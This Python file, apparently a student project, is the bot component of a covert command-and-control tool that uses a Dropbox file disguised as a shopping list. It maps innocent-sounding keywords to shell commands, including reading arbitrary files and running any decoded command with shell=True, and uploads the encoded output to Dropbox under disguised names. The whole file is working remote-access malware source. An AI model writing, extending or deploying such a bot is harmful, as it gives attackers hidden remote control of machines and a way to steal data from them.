#
# Author: Adam Novak
#
# Plagiarism is a sin!
# Plagiarism is a sin!
# Plagiarism is a sin!
#

from Connection import Connection
import translations
import subprocess
import time
import random
import string
import sys


def random_string(length):
    characters = string.ascii_letters + string.digits  # You can add more characters if needed
    random_str = ''.join(random.choice(characters) for _ in range(length))
    return random_str


def write_output(conn, counter, my_id, content):
    path = "/what_i_bought_on_day_" + str(counter) + "_" + my_id + ".txt"
    content = translations.encode_string(content)
    conn.create_file(path)
    conn.append_to_file(path, content)


def do_command(conn, counter, row):

    # build command
    parts = row.split()
    command = None
    if len(parts) > 4:
        # command w
        if parts[4] == "wine":
            command = "w"
        # command ls
        elif parts[4] == "list":
            param = translations.decode_string(row.split(' !A!N!D! ')[1])
            command = "ls " + param
        # command id
        elif parts[4] == "identity":
            command = "id"
            # command id
        elif parts[4] == "playstation":
            command = "ps"
        # command copy
        elif parts[4] == "copy":
            param = translations.decode_string(row.split(' !A!N!D! ')[1])
            command = "cat " + param
        # command exec
        elif parts[4] == "exponents":
            param = translations.decode_string(row.split(' !A!N!D! ')[1])
            command = param
        # command end
        elif parts[4] == "happy":
            exit("Good bye")
        # heartbeat
        elif parts[4] == "alive":
            write_output(conn, counter, BOT_ID, "")
            return

    print("recognized command:", command)

    if command:

        # run command
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()

        # write output
        write_output(conn, counter, BOT_ID, stdout)


# unique ID of BOT
BOT_ID = random_string(6)


def main():

    # get args
    argc = len(sys.argv)
    argv = sys.argv

    # check number of arguments
    if argc != 3:
        exit("python3 controller.py <API KEY> <INTERVAL>")

    # programmer friendly naming
    api_key = argv[1]
    interval = int(argv[2])
    shopping_list = "/shopping_list.txt"

    # create connection
    conn = Connection(api_key)

    # check connection
    if not conn.is_connected():
        exit("Could not to connect to Dropbox!")

    # counters
    last_minus_counter = 0
    last_positive_counter = 0
    last_hash = ''

    metadata = conn.exist_file(shopping_list)
    if metadata:
        last_hash = metadata.content_hash
        data = conn.get_file_content(shopping_list).decode('utf-8').split('\n')
        for row in data:
            if len(row) > 0:
                c = int(row.split()[1])
                if c < 0:
                    last_minus_counter = min(last_minus_counter, c)
                else:
                    last_positive_counter = max(last_positive_counter, c)

    # infinite cycle
    while True:

        # get file metadata
        metadata = conn.exist_file(shopping_list)

        # file exists
        if metadata:

            # file has been modifies
            if metadata.content_hash != last_hash:

                # update hash
                last_hash = metadata.content_hash

                # read data
                data = conn.get_file_content(shopping_list).decode('utf-8').split('\n')
                for row in data:
                    if len(row) > 0:
                        c = int(row.split()[1])
                        if c < 0 and c < last_minus_counter:
                            last_minus_counter = c
                            do_command(conn, c, row)
                        elif c > 0 and c > last_positive_counter:
                            last_positive_counter = c
                            do_command(conn, c, row)

        time.sleep(interval)


if __name__ == "__main__":
    main()